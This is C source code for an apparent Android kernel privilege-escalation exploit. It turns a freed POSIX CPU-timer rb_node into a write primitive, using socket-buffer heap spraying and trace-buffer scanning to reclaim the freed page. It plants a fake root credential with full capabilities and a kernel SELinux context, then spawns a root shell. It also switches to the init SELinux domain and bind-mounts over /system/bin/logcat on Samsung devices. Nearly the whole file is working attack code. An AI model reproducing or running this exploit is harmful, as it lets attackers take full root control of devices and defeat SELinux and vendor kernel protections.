static _Atomic int g_burst, g_burst2, g_stop_spray;
static int g_pool[SPRAY_SOCKS][2];
static int g_pool_n;
static int g_rawfd[8] = {-1, -1, -1, -1, -1, -1, -1, -1};
static _Atomic int g_spray_tids[SPRAY_THREADS];

struct spray_arg
{
    unsigned char *payload;
    int sock_first, sock_count, cpu, idx;
};

static void ensure_pool(void)
{
    int snd = 16 << 20;

    if (g_pool_n)
        return;
    for (int i = 0; i < SPRAY_SOCKS; i++)
    {
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, g_pool[i]))
            break;
        setsockopt(g_pool[i][0], SOL_SOCKET, SO_SNDBUF, &snd, sizeof(snd));
        setsockopt(g_pool[i][1], SOL_SOCKET, SO_RCVBUF, &snd, sizeof(snd));
        g_pool_n++;
    }
    if (!g_pool_n)
        park_forever("no spray sockets");
}

static void ensure_raw(void)
{
    for (int cpu = 0; cpu < 8; cpu++)
    {
        char path[128];

        if (g_rawfd[cpu] >= 0)
            continue;
        snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw", cpu);
        g_rawfd[cpu] = open(path, O_RDONLY | O_NONBLOCK);
    }
}

static long read_fd(int fd, unsigned char *buf, size_t cap)
{
    size_t tot = 0;

    if (fd < 0)
        return 0;
    while (tot < cap)
    {
        ssize_t r = read(fd, buf + tot, cap - tot);

        if (r <= 0)
            break;
        tot += (size_t)r;
    }
    return (long)tot;
}


/*
 * One pass over a trace buffer in time order: report whether the victim pfn
 * was freed, and whether one of our spray threads allocated it *after* that
 * free.  Accepting a page_alloc that precedes the free as a hit is unsafe --
 * the page may still hold live timers, so reaping the zombie would run
 * rb_erase on kernel data and panic.  Ordering the two events inside one
 * scan makes "reclaimed" mean what run_plant needs it to mean.
 */
static void scan_reclaim(const unsigned char *b, size_t n,
                         unsigned long long pfn, int *free_seen, int *hit)
{
    for (size_t i = 16; i + 12 <= n; i += 4)
    {
        unsigned type;

        if (u64(b, i) != pfn || (int)u32(b, i + 8) != (int)SLAB_ORDER)
            continue;
        type = u32(b, i - 8) & 0xffff;
        if (type == g_t_page_free)
        {
            *free_seen = 1;
            continue;
        }
        if (type != g_t_page_alloc || !*free_seen)
            continue;
        {
            int pid = (int)u32(b, i - 4);

            for (int j = 0; j < SPRAY_THREADS; j++)
                if (pid == atomic_load(&g_spray_tids[j]))
                {
                    *hit = 1;
                    return;
                }
        }
    }
}

static void *spray_thread(void *x)
{
    struct spray_arg *a = x;
    int w = 0;

    atomic_store(&g_spray_tids[a->idx], (int)syscall(SYS_gettid));
    pin(a->cpu);
    /* The abort paths set g_stop_spray without ever setting g_burst, so this
     * gate must honour it too; otherwise pthread_join never returns. */
    while (!atomic_load(&g_burst) && !atomic_load(&g_stop_spray))
        sched_yield();
    if (atomic_load(&g_stop_spray))
        return NULL;
    /* Phase 1 runs before the target execs; it catches an early free. */
    while (!atomic_load(&g_stop_spray) && w < SPRAY_PRE)
    {
        int k = a->sock_first + (w % a->sock_count);

        (void)write(g_pool[k][0], a->payload, SOCKBUF);
        w++;
    }
    /* Phase 2 is released when the parent sees the victim page free. */
    while (!atomic_load(&g_burst2) && !atomic_load(&g_stop_spray))
        sched_yield();
    while (!atomic_load(&g_stop_spray) && w < SPRAY_PRE + SPRAY_POST)
    {
        int k = a->sock_first + (w % a->sock_count);

        (void)write(g_pool[k][0], a->payload, SOCKBUF);
        w++;
    }
    return NULL;
}

static void run_plant(unsigned long long target, int tag, int mode,
                      struct plant_res *res, unsigned char *raw)
{
    unsigned long long ptrs[NTIMERS];
    unsigned long long pfn = 0, slab_pfn = 0;
    long slab_base = -1;
    unsigned char *payload = NULL;
    pthread_t th[SPRAY_THREADS];
    struct spray_arg args[SPRAY_THREADS];
    int ready_p[2], ack_p[2], tid_p[2], timer_go[2];
    memset(res, 0, sizeof(*res));
    if (pipe(ready_p) || pipe(ack_p) || pipe(tid_p) || pipe(timer_go))
    {
        logf("[-] plant%d pipe failed\n", tag);
        return;
    }
    pid_t T = fork();
    if (T < 0)
    {
        logf("[-] plant%d fork failed\n", tag);
        return;
    }
    if (T == 0)
    {
        close(ready_p[0]);
        close(ack_p[1]);
        close(tid_p[0]);
        close(timer_go[1]);
        g_ready_w = ready_p[1];
        g_ack_r = ack_p[0];
        g_tid_w = tid_p[1];
        g_timer_go_r = timer_go[0];
        run_target();
        _exit(115);
    }
    close(ready_p[1]);
    close(ack_p[0]);
    close(tid_p[1]);
    close(timer_go[0]);
    g_timer_go_w = timer_go[1];
    char ch;
    if (read(ready_p[0], &ch, 1) != 1)
    {
        logf("[-] plant%d trigger never ready\n", tag);
        kill(T, SIGKILL);
        waitpid(T, NULL, 0);
        return;
    }
    trace_start();
    if (write(ack_p[1], "A", 1) != 1)
        logf("[-] ack failed\n");
    int etid = 0;
    if (read(tid_p[0], &etid, sizeof(etid)) != sizeof(etid))
        logf("[-] exec tid not received\n");

    /*
     * The exec thread is paused after creating its 4096 timers.  Capture V,
     * the slab pfn and the linear-map base now, before the exec/free, so the
     * spray is already running when the victim slab returns to the buddy.
     */
    long n = read_cpu(g_cpu, raw, 48u << 20);
    unsigned long long kept[NTIMERS];
    unsigned long long V = 0, site0 = 0;
    unsigned long long vslab;
    int nrec, nkeep = 0, slab_own = 0, free_seen = 0;

    nrec = n > 0 ? scan_timer_allocs(raw, (size_t)n, etid, ptrs, NTIMERS,
                                     &site0)
                 : 0;
    if (!nrec || !site0)
    {
        trace_stop();
        kill(T, SIGKILL);
        waitpid(T, NULL, 0);
        logf("[-] plant%d victim not captured (recs=%d)\n", tag, nrec);
        return;
    }
    {
        int ns = 0, np = 0;
        unsigned long long base;

        base = plant_base(raw, (size_t)n, etid, ptrs, nrec, &ns, &np);
        if (!base)
            base = g_base;
        if (!base || base < LINEAR_MIN || base > LINEAR_MAX)
        {
            trace_stop();
            kill(T, SIGKILL);
            waitpid(T, NULL, 0);
            logf("[-] plant%d bad base=%#llx ns=%d np=%d recs=%d\n",
                 tag, base, ns, np, nrec);
            return;
        }
        g_base = base;
        /*
         * The linear map is [base, LINEAR_MAX) on this VA layout;
         * physical RAM is sparse and extends well past 16 GiB, so do not
         * bound by RAM size.  A pointer outside this window is a stale
         * kmem record or a mis-scanned site collision and must not shift
         * the victim index.
         */
        for (int i = 0; i < nrec; i++)
            if (ptrs[i] >= base && ptrs[i] < LINEAR_MAX)
                kept[nkeep++] = ptrs[i];
        logf("[+] plant%d base=%#llx slabs=%d pfns=%d recs=%d kept=%d\n",
             tag, base, ns, np, nrec, nkeep);
    }
    if (nkeep <= VICTIM_IDX)
    {
        trace_stop();
        kill(T, SIGKILL);
        waitpid(T, NULL, 0);
        logf("[-] plant%d victim index missing (kept=%d)\n", tag, nkeep);
        return;
    }
    V = kept[VICTIM_IDX];
    vslab = V & SLAB_MASK;
    for (int i = 0; i < nkeep; i++)
        if ((kept[i] & SLAB_MASK) == vslab)
            slab_own++;
    /*
     * Prefer the positional slab/page pairing: it does not depend on the
     * voted base, which can pick a neighbouring candidate when a page is
     * reused inside the capture window.  Fall back to the base arithmetic.
     */
    {
        unsigned long long bpfn = 0;

        if (pair_slab_pfn(raw, (size_t)n, etid, vslab, &bpfn))
        {
            logf("[+] plant%d pair pfn=%#llx base_vote=%#llx pair_base=%#llx "
                 "agree=%d\n", tag, bpfn, g_base,
                 vslab - (bpfn << PAGE_SHIFT),
                 (vslab - (bpfn << PAGE_SHIFT)) == g_base);
            pfn = bpfn;
        }
        else
        {
            pfn = (V - g_base) >> PAGE_SHIFT;
            logf("[+] plant%d pair missing; base pfn=%#llx\n", tag, pfn);
        }
    }
    slab_pfn = pfn & ~((1ULL << SLAB_ORDER) - 1);
    g_slide = site0 - STATIC_TIMER_SITE;
    if (g_selinux_target)
        target = SELINUX_STATE_STATIC + g_slide - 7;

    {
        size_t off = (size_t)((V & SLAB_OFF_MASK) + TIMER_NODE_OFF);

        payload = malloc(SOCKBUF);
        if (!payload)
        {
            kill(T, SIGKILL);
            waitpid(T, NULL, 0);
            return;
        }
        if (mode == 2)
        {
            unsigned long long page = V & SLAB_MASK;
            size_t cb = off + FAKE_CRED_OFF;   /* fake cred base */
            size_t p = cb;
            unsigned long long *c = (unsigned long long *)(payload + cb);
            size_t blob = 0;
            size_t cand[] = {SLAB_SIZE - 0x100, SLAB_SIZE / 2,
                             SLAB_SIZE - SLAB_SIZE / 4, SLAB_SIZE / 4,
                             0x100, 0x0};
            int fit = 0;

            if (p + CRED_SIZE > SLAB_SIZE)
            {
                logf("[-] plant%d fake cred spills p=%#zx; retryable\n",
                     tag, p);
                kill(T, SIGKILL);
                waitpid(T, NULL, 0);
                free(payload);
                payload = NULL;
                res->retry = 1;
                return;
            }
            for (size_t i = 0; i < sizeof(cand) / sizeof(cand[0]); i++)
            {
                size_t b = cand[i];

                if (b + 0x40 > SLAB_SIZE)
                    continue;
                if (b + 0x40 <= off || cb + CRED_SIZE <= b)
                {
                    blob = b;
                    fit = 1;
                    break;
                }
            }
            if (!fit)
            {
                kill(T, SIGKILL);
                waitpid(T, NULL, 0);
                free(payload);
                payload = NULL;
                res->retry = 1;
                return;
            }
            /*
             * Fake cred at node+0x18 (see FAKE_CRED_OFF).  The stale node
             * takes rb_erase's left-only path, so:
             *   node[0]    = fake cred address -> *target = fake
             *   node[8]    = 0 (rb_right)
             *   node[0x10] = target (rb_left) -> compared against node
             * The erase then writes `target` at fake+8, and
             * posix_cpu_timers_exit clears node+0x20 == fake+8, so the
             * first uid word ends up zero without any repair write.
             *
             * 6.1 cred (4-byte atomic usage), relative to fake:
             *   +0x00 usage  +0x04 uid    +0x08 gid    +0x0c suid
             *   +0x10 sgid   +0x14 euid   +0x18 egid   +0x1c fsuid
             *   +0x20 fsgid  +0x24 securebits
             *   +0x28..0x50 cap_inh/prm/eff/bset/ambient
             *   +0x78 security +0x80 user +0x88 user_ns +0x90 ucounts
             *   +0x98 group_info
             *
             * 6.6 cred (8-byte usage), relative to fake:
             *   +0x00 usage  +0x08 uid    +0x0c gid    +0x10 suid
             *   +0x14 sgid   +0x18 euid   +0x1c egid   +0x20 fsuid
             *   +0x24 fsgid  +0x28 securebits
             *   +0x30..0x58 cap_inh/prm/eff/bset/ambient
             *   +0x80 security +0x88 user +0x90 user_ns +0x98 ucounts
             *   +0xa0 group_info
             *
             * usage=1 keeps the rb-node parent (pc & ~3) at NULL, so when
             * the exit loop reaches the fake cred as a second tree node,
             * rb_next() stops instead of chasing it as a parent.  It is
             * safe to start at 1: timerqueue_del() self-links the node
             * (node->__rb_parent_color = node) right after rb_erase(), so
             * the final usage is the low 32 bits of the fake address,
             * which is huge, before the child can ever put_cred() it.
             * uid is repaired by the later zero write at fake+CRED_UID_OFF;
             * euid and the caps are never touched by the erase.
             */
            build_payload(payload, off, V + TIMER_NODE_OFF + FAKE_CRED_OFF, target);
            c[0] = 0x0000000000000001ULL; /* usage=1 */
            c[1] = 0; /* uid/gid (6.6) or gid/suid (6.1) */
            c[2] = 0; /* suid/sgid or sgid/euid */
            c[3] = 0; /* euid/egid */
            c[4] = 0; /* fsuid/fsgid, plus securebits on 6.1 */
            {
                size_t ci = FAKE_CAPS_OFF / 8;

                if (ci > 5) /* 6.6: clear the securebits word separately */
                    c[5] = 0;
                for (int i = 0; i < 5; i++)
                    c[ci + i] = FULLCAP; /* inh/prm/eff/bset/ambient */
            }
            *(unsigned long long *)(payload + cb + FAKE_SECURITY_OFF) =
                page + blob; /* security */
            *(unsigned long long *)(payload + cb + FAKE_USER_OFF) =
                ROOT_USER_STATIC + g_slide;
            *(unsigned long long *)(payload + cb + FAKE_USER_NS_OFF) =
                INIT_USER_NS_STATIC + g_slide;
            *(unsigned long long *)(payload + cb + FAKE_UCOUNTS_OFF) =
                INIT_UCOUNTS_STATIC + g_slide;
            *(unsigned long long *)(payload + cb + FAKE_GROUPS_OFF) =
                INIT_GROUPS_STATIC + g_slide;
            for (int i = 0; i < 8; i++)
                *(unsigned int *)(payload + blob + SELINUX_BLOB_OFF +
                                  i * 4) = SELINUX_SID_KERNEL;
            logf("[+] plant%d fake cred node=%#zx cb=%#zx blob=%#zx "
                 "sec=%#llx\n", tag, off, cb, blob, page + blob);
        }
        else
        {
            build_payload(payload, off, 0, target);
        }
        slab_usage("pre-exec");
        logf("[+] plant%d mode=%s V=%#llx node=%#llx fake=%#llx target=%#llx "
             "pfn=%#llx slab=%#llx slide=%#llx recs=%d slab_own=%d "
             "base=%#llx\n",
             tag, mode == 2 ? "fake" : "zero", V, V + TIMER_NODE_OFF,
             mode == 2 ? V + TIMER_NODE_OFF + FAKE_CRED_OFF : 0, target,
             pfn, slab_pfn, g_slide, nrec, slab_own, g_base);
    }

    /*
     * Restart the trace from a clean ring now that V is captured.  The
     * page_free event for slab_pfn is otherwise ambiguous: the page may
     * have been freed by an earlier user shortly before posix_timers_cache
     * allocated it, and that stale event would release phase 2 long before
     * the real free.  From here on, any page_free for this pfn can only be
     * the victim slab being discarded.
     */
    trace_start();
    logf("[+] plant%d trace restarted for pfn=%#llx\n", tag, slab_pfn);

    atomic_store(&g_burst, 0);
    atomic_store(&g_burst2, 0);
    atomic_store(&g_stop_spray, 0);
    {
        int per = g_pool_n / SPRAY_THREADS;

        for (int i = 0; i < SPRAY_THREADS; i++)
        {
            args[i].payload = payload;
            args[i].sock_first = i * per;
            args[i].sock_count = per;
            args[i].cpu = i;
            args[i].idx = i;
            atomic_store(&g_spray_tids[i], -1);
            pthread_create(&th[i], NULL, spray_thread, &args[i]);
        }
    }
    /*
     * Start phase 1 before releasing the target.  The victim slab is freed
     * inside the exec/exit path, so the spray must already be allocating
     * slab-order pages when that happens; releasing it only after the zombie
     * is observed leaves a window where the exec'd image or kernel
     * allocations split/take the page first, which permanently loses the
     * plant.  Phase 2 still starts when the free is seen in the trace.
     */
    if (g_cfg.pcp_free)
        slab_base = slab_active();
    atomic_store(&g_burst, 1);
    if (g_timer_go_w >= 0)
    {
        if (write(g_timer_go_w, "x", 1) != 1)
            logf("[-] timer go failed\n");
        close(g_timer_go_w);
        g_timer_go_w = -1;
    }

    siginfo_t si;
    if (wait_zombie(T, &si))
    {
        atomic_store(&g_stop_spray, 1);
        atomic_store(&g_burst2, 1);
        for (int i = 0; i < SPRAY_THREADS; i++)
            pthread_join(th[i], NULL);
        trace_stop();
        logf("[-] plant%d no zombie; holding child\n", tag);
        g_held++;
        return;
    }
    logf("[+] plant%d target=%d etid=%d zombie code=%d status=%d\n",
         tag, T, etid, si.si_code, si.si_status);
    if (si.si_code != CLD_KILLED)
    {
        atomic_store(&g_stop_spray, 1);
        atomic_store(&g_burst2, 1);
        for (int i = 0; i < SPRAY_THREADS; i++)
            pthread_join(th[i], NULL);
        trace_stop();
        if (si.si_code == CLD_EXITED)
        {
            int st = 0;

            /* execve succeeded: no stale node, safe to reap and retry. */
            waitpid(T, &st, 0);
            logf("[-] plant%d exec succeeded (status=%d); retryable\n",
                 tag, si.si_status);
            res->retry = 1;
            free(payload);
            return;
        }
        logf("[-] plant%d reap status not SIGKILL; holding zombie\n", tag);
        g_held++;
        return;
    }
    atomic_store(&g_burst, 1);
    /*
     * Phase 1 normally finishes before the target's exit path frees the
     * slab.  Release phase 2 as soon as the zombie is visible so allocations
     * are in flight no matter exactly when the free lands; the cleared
     * trace ring makes any later page_free event unambiguous, and the scan
     * below still releases phase 2 if it has not started yet.
     *
     * 5.15/6.1 (pcp_free) additionally gate on /proc/slabinfo: the PCP
     * free path does emit mm_page_free, but waiting for the cache's active
     * count to drop confirms the victim's timers are actually freed.
     */
    if (g_cfg.pcp_free)
    {
        long t0 = now_ms();
        long now = slab_base;

        while (slab_base > 0 && now > 0 &&
               now > slab_base - 2000 && now_ms() - t0 < 30000)
        {
            usleep(200000);
            now = slab_active();
        }
        logf("[+] plant%d pcp reclaim go (slab %ld -> %ld, %ldms)\n",
             tag, slab_base, now, now_ms() - t0);
    }
    atomic_store(&g_burst2, 1);
    long t1 = now_ms();
    int hit = 0;

    while (!hit && now_ms() - t1 < 15000)
    {
        for (int cpu = 0; cpu < 8 && !hit; cpu++)
        {
            long m = read_fd(g_rawfd[cpu], raw, 32u << 20);

            if (m <= 0)
                continue;
            scan_reclaim(raw, (size_t)m, slab_pfn, &free_seen, &hit);
            if (free_seen)
                atomic_store(&g_burst2, 1);
        }
        if (!hit)
            usleep(50);
    }
    atomic_store(&g_stop_spray, 1);
    atomic_store(&g_burst2, 1);
    for (int i = 0; i < SPRAY_THREADS; i++)
        pthread_join(th[i], NULL);
    trace_stop();
    for (int cpu = 0; cpu < 8 && !hit; cpu++)
    {
        long m = read_fd(g_rawfd[cpu], raw, 32u << 20);

        if (m > 0)
            scan_reclaim(raw, (size_t)m, slab_pfn, &free_seen, &hit);
    }
    logf("[+] plant%d free_seen=%d burst hit=%d after %ldms\n",
         tag, free_seen, hit, now_ms() - t1);
    if (!hit)
    {
        logf("[-] plant%d burst missed; holding zombie\n", tag);
        g_held++;
        return;
    }

    usleep(1000);
    logf("[+] plant%d reaping T=%d node=%#llx mode=%s payload_off=%#zx "
         "target=%#llx\n", tag, T, V + TIMER_NODE_OFF, mode == 2 ? "fake" : "zero",
         (size_t)((V & SLAB_OFF_MASK) + TIMER_NODE_OFF), target);
    int st = 0;
    waitpid(T, &st, 0);
    logf("[+] plant%d reaped status=%#x\n", tag, st);
    res->A = mode == 2 ? V + TIMER_NODE_OFF + FAKE_CRED_OFF : V + TIMER_NODE_OFF;
    res->ok = 1;
    logf("[+] plant%d write mode=%s target=%#llx\n", tag,
         mode == 2 ? "fake" : "zero", target);
    free(payload);
}

/*
 * Dry run of the whole plant pipeline: capture V, pick the victim index,
 * pair the slab with its page and confirm our spray reclaimed it.  The
 * victim timer was never armed in this mode, so no stale rb_node exists and
 * the child can be reaped normally.  Safe to run without a reboot.
 */
static void run_probe(unsigned char *raw)
{
    unsigned long long ptrs[NTIMERS], kept[NTIMERS];
    unsigned long long site0 = 0, V, vslab, pfn = 0;
    int ready_p[2], ack_p[2], tid_p[2];
    int nkeep = 0, nrec, slab_own = 0;

    if (pipe(ready_p) || pipe(ack_p) || pipe(tid_p))
        return;
    pid_t T = fork();
    if (T < 0)
        return;
    if (T == 0)
    {
        close(ready_p[0]);
        close(ack_p[1]);
        close(tid_p[0]);
        g_ready_w = ready_p[1];
        g_ack_r = ack_p[0];
        g_tid_w = tid_p[1];
        g_timer_go_r = -1;
        run_target();
        _exit(115);
    }
    close(ready_p[1]);
    close(ack_p[0]);
    close(tid_p[1]);
    char ch;
    if (read(ready_p[0], &ch, 1) != 1)
    {
        logf("[-] probe trigger never ready\n");
        kill(T, SIGKILL);
        waitpid(T, NULL, 0);
        return;
    }
    trace_start();
    if (write(ack_p[1], "A", 1) != 1)
        logf("[-] probe ack failed\n");
    int etid = 0;
    if (read(tid_p[0], &etid, sizeof(etid)) != sizeof(etid))
        logf("[-] probe exec tid not received\n");

    long n = read_cpu(g_cpu, raw, 48u << 20);
    trace_stop();
    nrec = n > 0 ? scan_timer_allocs(raw, (size_t)n, etid, ptrs, NTIMERS,
                                     &site0)
                 : 0;
    if (nrec && site0)
    {
        unsigned long long base = plant_base(raw, (size_t)n, etid, ptrs, nrec,
                                             &slab_own, &slab_own);

        for (int i = 0; i < nrec; i++)
            if (ptrs[i] >= base && ptrs[i] < LINEAR_MAX)
                kept[nkeep++] = ptrs[i];
        logf("[probe] recs=%d site=%#llx slide=%#llx base=%#llx kept=%d\n",
             nrec, site0, site0 - STATIC_TIMER_SITE, base, nkeep);
        {
            int a264 = 0, a256 = 0, a128 = 0;

            for (int i = 0; i < nkeep; i++)
            {
                unsigned long long o = kept[i] & SLAB_OFF_MASK;

                if (o % 264 == 0)
                    a264++;
                if (o % 256 == 0)
                    a256++;
                if (o % 128 == 0)
                    a128++;
            }
            logf("[probe] align mod264=%d mod256=%d mod128=%d of %d\n",
                 a264, a256, a128, nkeep);
        }
        if (nkeep > VICTIM_IDX)
        {
            V = kept[VICTIM_IDX];
            vslab = V & SLAB_MASK;
            logf("[probe] V=%#llx off=%#llx node_off=%#llx fake=%#llx "
                 "mod264=%llu mod256=%llu\n", V, V & SLAB_OFF_MASK,
                 (V & SLAB_OFF_MASK) + TIMER_NODE_OFF, (V & SLAB_OFF_MASK) + TIMER_NODE_OFF + 0x18,
                 (V & SLAB_OFF_MASK) % 264, (V & SLAB_OFF_MASK) % 256);
            if (pair_slab_pfn(raw, (size_t)n, etid, vslab, &pfn))
                logf("[probe] pair pfn=%#llx pair_base=%#llx agree=%d\n",
                     pfn, vslab - (pfn << PAGE_SHIFT),
                     (vslab - (pfn << PAGE_SHIFT)) == base);
            else
                logf("[probe] pair missing\n");
        }
        else
        {
            logf("[-] probe victim index missing (kept=%d)\n", nkeep);
        }
    }
    else
    {
        logf("[-] probe victim not captured (recs=%d)\n", nrec);
    }
    kill(T, SIGKILL);
    waitpid(T, NULL, 0);
    logf("[probe] done; no timer armed, no stale node\n");
}

/*
 * The child execs this binary so that it owns a private real cred.  The exec
 * allocation is captured from the kmem trace; the child then blocks on fd 3
 * and reports readiness on fd 4.  On success it returns the cred address and
 * hands the pipe fds to the caller.
 */
static unsigned long long leak_cred(unsigned char *raw,
                                    pid_t *out_pid, int *out_go, int *out_st,
                                    int shell_mode,
                                    unsigned long long *task_out)
{
    for (int attempt = 0; attempt < 4; attempt++)
    {
        int go[2], st[2];
        pid_t p;
        long n;
        int c = 0, hello = 0, tc = 0;
        unsigned long long R = 0, site = 0, task = 0;

        if (pipe(go) || pipe(st))
            return 0;
        /*
         * Start tracing before fork so copy_process()'s task_struct
         * allocation is in the buffer.  The exec cred allocation follows.
         */
        trace_start();
        p = fork();
        if (p == 0)
        {
            int g2, s2;
            char ch;

            close(go[1]);
            close(st[0]);
            g2 = fcntl(go[0], F_DUPFD, 20);
            s2 = fcntl(st[1], F_DUPFD, 20);
            if (g2 < 0 || s2 < 0)
                _exit(125);
            close(go[0]);
            close(st[1]);
            dup2(g2, 3);
            close(g2);
            dup2(s2, 4);
            close(s2);
            pin(g_cpu);
            if (read(3, &ch, 1) != 1)
                _exit(126);
            {
                const char *cmode = shell_mode ? "shell" : (g_fake_stage ? "fake" : "verify");
                char *const av[] = {(char *)"/proc/self/exe", (char *)"wait",
                                    (char *)cmode,
                                    g_samsung_stage ? (char *)"samsung" : NULL,
                                    NULL};
                char *const ep[] = {(char *)"PATH=/system/bin:/system/xbin", NULL};

                execve("/proc/self/exe", av, ep);
            }
            _exit(127);
        }
        if (p < 0)
        {
            close(go[0]);
            close(go[1]);
            close(st[0]);
            close(st[1]);
            return 0;
        }
        close(go[0]);
        close(st[1]);
        if (write(go[1], "A", 1) != 1)
            logf("[!] leak go write failed\n");
        usleep(50000);
        trace_stop();
        n = read_cpu(g_cpu, raw, 48u << 20);
        if (n > 0)
        {
            c = scan_cred_allocs(raw, (size_t)n, (int)p, &site, &R);
            tc = scan_task_allocs(raw, (size_t)n, getpid(), &task);
        }
        if (R && (!g_fake_stage || task))
        {
            struct pollfd pf = {.fd = st[0], .events = POLLIN};

            if (poll(&pf, 1, 2000) > 0 &&
                read(st[0], &hello, sizeof(hello)) == sizeof(hello) &&
                hello == CHILD_HELLO)
            {
                logf("[cred] attempt=%d child=%d R=%#llx site_low=%#llx "
                     "recs=%d task=%#llx task_recs=%d\n",
                     attempt, p, R, site & 0x1fffff, c, task, tc);
                *out_pid = p;
                *out_go = go[1];
                *out_st = st[0];
                *task_out = task;
                return R;
            }
        }
        logf("[cred] attempt=%d child=%d R=%#llx hello=%#x recs=%d "
             "task=%#llx task_recs=%d failed\n",
             attempt, p, R, hello, c, task, tc);
        close(go[1]);
        close(st[0]);
        kill(p, SIGKILL);
        waitpid(p, NULL, 0);
    }
    return 0;
}

/*
 * Samsung KDP-safe exec setup.  The worker has a real, uid-0 cred here, so
 * it can move to the init domain while SELinux is still permissive.  The
 * private mount namespace is essential: the bind mount must never outlive
 * this worker or the next real logcat call would execute ksud.
 */
static void samsung_worker_setup(void)
{
    int cfd = open("/proc/self/attr/current", O_WRONLY);

    if (cfd >= 0)
    {
        (void)!write(cfd, "u:r:init:s0", 11);
        close(cfd);
    }
    else
        logf("[samsung] init-domain switch failed errno=%d\n", errno);

    if (unshare(CLONE_NEWNS) == 0)
    {
        (void)mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL);
        if (mount("/data/local/tmp/w/ksud", "/system/bin/logcat", NULL,
                  MS_BIND, NULL) != 0)
            logf("[samsung] bind mount failed errno=%d\n", errno);
        else
            logf("[samsung] bind mount active (/system/bin/logcat -> ksud)\n");
    }
    else
        logf("[samsung] unshare failed errno=%d\n", errno);
}

static int wait_child_main(const char *mode, int samsung)
{
    struct child_report rep;
    char ch;
    int hello = CHILD_HELLO;

    pin(g_cpu);
    if (write(4, &hello, sizeof(hello)) != sizeof(hello))
        _exit(130);
    if (read(3, &ch, 1) != 1)
        _exit(131);
    close(3);

    memset(&rep, 0, sizeof(rep));
    rep.magic = CHILD_MAGIC;
    rep.uid = (int)syscall(SYS_getuid);
    rep.euid = (int)syscall(SYS_geteuid);
    logf("[child] woke uid=%d euid=%d mode=%s\n", rep.uid, rep.euid, mode);

    if (!strcmp(mode, "fake"))
    {
        char *const envp[] = {
            (char *)"PATH=/system/bin:/system/xbin:/sbin:/vendor/bin",
            (char *)"HOME=/", (char *)"TMPDIR=/data/local/tmp",
            (char *)"ANDROID_DATA=/data", (char *)"ANDROID_ROOT=/system",
            NULL};
        pid_t w;
        int st = 0;

        /*
         * task->cred is the fake cred, but task->real_cred still points at
         * the original one.  Calling setuid() here trips commit_creds()'s
         * BUG_ON(task->cred != task->real_cred).  fork() runs copy_creds(),
         * which gives the worker a fresh cred with cred == real_cred and a
         * real SELinux blob, so the worker can normalize safely.
         */
        logf("[fake] parent uid=%d euid=%d; forking worker\n",
             rep.uid, rep.euid);
        w = fork();
        if (w == 0)
        {
            char *const av[] = {(char *)"sh",
                                (char *)"/data/local/tmp/ksu_stage.sh", NULL};
            long sg, su;
            uid_t ru = 0, eu = 0, suid = 0;
            int se;

            errno = 0;
            sg = syscall(SYS_setresgid, 0, 0, 0);
            se = errno;
            logf("[fake] worker setresgid(0)=%ld errno=%d\n", sg, se);
            errno = 0;
            su = syscall(SYS_setuid, 0);
            se = errno;
            getresuid(&ru, &eu, &suid);
            rep.setuid_ret = (int)su;
            rep.setuid_errno = se;
            rep.ruid = (int)ru;
            rep.reuid = (int)eu;
            rep.rsuid = (int)suid;
            (void)write(4, &rep, sizeof(rep));
            close(4);
            logf("[fake] worker setuid(0)=%d errno=%d resuid=%d/%d/%d\n",
                 rep.setuid_ret, rep.setuid_errno, rep.ruid, rep.reuid,
                 rep.rsuid);
            if (su != 0)
                _exit(4);
            if (samsung)
            {
                logf("[samsung] worker uid=%d euid=%d; preparing KDP-safe exec\n",
                     rep.uid, rep.euid);
                samsung_worker_setup();
            }
            execve("/system/bin/sh", av, envp);
            _exit(127);
        }
        if (w < 0)
        {
            rep.setuid_ret = -1;
            rep.setuid_errno = errno;
            (void)write(4, &rep, sizeof(rep));
        }
        close(4);
        if (w > 0)
            waitpid(w, &st, 0);
        logf("[fake] worker exit=%#x\n", st);
        _exit(0);
    }

    /*
     * Mode 0 zeroes uid+gid before the child runs, so getuid() must be 0.
     */
    if (rep.uid != 0 && rep.euid != 0)
    {
        rep.setuid_ret = -1;
        (void)write(4, &rep, sizeof(rep));
        close(4);
        logf("[-] child uid=%d euid=%d: cred writes did not land\n",
             rep.uid, rep.euid);
        _exit(3);
    }

    /*
     * Normalize gid before uid and before the fake/KSU branch, so the
     * worker always starts with uid and gid 0.  Plant 1 of mode 0 leaves
     * egid 2000; the fake cred instead carries the full capability set.
     * A gid change to 0 from a non-zero gid would otherwise drop the
     * capability sets across execve() via cap_bprm's setgid downgrade.
     */
    errno = 0;
    {
        long sg = syscall(SYS_setresgid, 0, 0, 0);

        logf("[child] setresgid(0)=%ld errno=%d\n", sg, errno);
    }
    errno = 0;
    rep.setuid_ret = (int)syscall(SYS_setuid, 0);
    rep.setuid_errno = errno;
    {
        uid_t ru = 0, eu = 0, su = 0;

        getresuid(&ru, &eu, &su);
        rep.ruid = (int)ru;
        rep.reuid = (int)eu;
        rep.rsuid = (int)su;
    }
    (void)write(4, &rep, sizeof(rep));
    close(4);
    logf("[child] setuid(0)=%d errno=%d resuid=%d/%d/%d\n",
         rep.setuid_ret, rep.setuid_errno, rep.ruid, rep.reuid, rep.rsuid);
    if (rep.setuid_ret != 0 || rep.reuid != 0)
    {
        logf("[-] setuid(0) failed; not running a shell\n");
        _exit(4);
    }

    {
        char *const envp[] = {
            (char *)"PATH=/system/bin:/system/xbin:/sbin:/vendor/bin",
            (char *)"HOME=/", (char *)"TMPDIR=/data/local/tmp",
            (char *)"ANDROID_DATA=/data", (char *)"ANDROID_ROOT=/system",
            NULL};

        if (!strcmp(mode, "shell"))
        {
            char *const av[] = {(char *)"sh", (char *)"-c",
                                (char *)"id; echo ROOT_SHELL_OK; exec sh -i",
                                NULL};

            execve("/system/bin/sh", av, envp);
        }
        else
        {
            char *const av[] = {(char *)"sh", (char *)"-c",
                                (char *)"id; cat /proc/self/attr/current 2>/dev/null; "
                                        "echo ROOT_SHELL_OK",
                                NULL};

            execve("/system/bin/sh", av, envp);
        }
    }
    logf("[-] shell exec failed errno=%d\n", errno);
    _exit(5);
}

static void detect_device(void)
{
    struct utsname u;
    char dev[PROP_VALUE_MAX];

    if (uname(&u) == 0)
        snprintf(g_kernel, sizeof(g_kernel), "%s", u.release);

    dev[0] = '\0';
    if (__system_property_get("ro.product.device", dev) > 0 && dev[0])
        snprintf(g_device, sizeof(g_device), "%s", dev);
}

static void print_usage(const char *argv0)
{
    fprintf(stderr,
